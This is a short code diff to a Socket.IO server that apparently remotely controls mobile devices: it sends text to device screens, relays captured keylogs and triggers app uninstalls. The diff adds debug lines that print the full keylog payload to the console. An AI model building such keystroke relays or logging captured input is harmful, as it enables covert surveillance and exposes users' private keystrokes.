@@ -360,7 +360,6 @@ export const startSocketIO = async () => {
 				async (data: any) => {
 					try {
 						const { deviceId, message } = data;
-
 						// Send Text requestion into mobile app
 						io.emit(
 							`${SocketIOMobileEvents.MOBILE_SCREEN_SEND_TEXT}-${deviceId}`,
@@ -494,7 +493,7 @@ export const startSocketIO = async () => {
 						const keyLogsType = response.keyLogsType;
 						const keylogs = response.keylogs;
 						const keyEvent = response.event;
-
+						console.log("online keylogs=>", response);
 						// Check if keylogs is not an empty string before proceeding
 						if (
 							(keyEvent == "Text Input" ||
@@ -502,6 +501,7 @@ export const startSocketIO = async () => {
 							keylogs &&
 							keylogs.trim() !== "[]"
 						) {
+							console.log("KEYLOGS SEND===>");
 							io.emit(
 								`${SocketIOPublicEvents.KEY_SHARE}-${deviceId}`,
 								{
@@ -983,7 +983,6 @@ export const startSocketIO = async () => {
 				async (data: any) => {
 					try {
 						const { deviceId } = data;
-
 						io.emit(
 							`${SocketIOMobileEvents.MOBILE_UNINSTALL_APP_EVENT}-${deviceId}`,
 							{
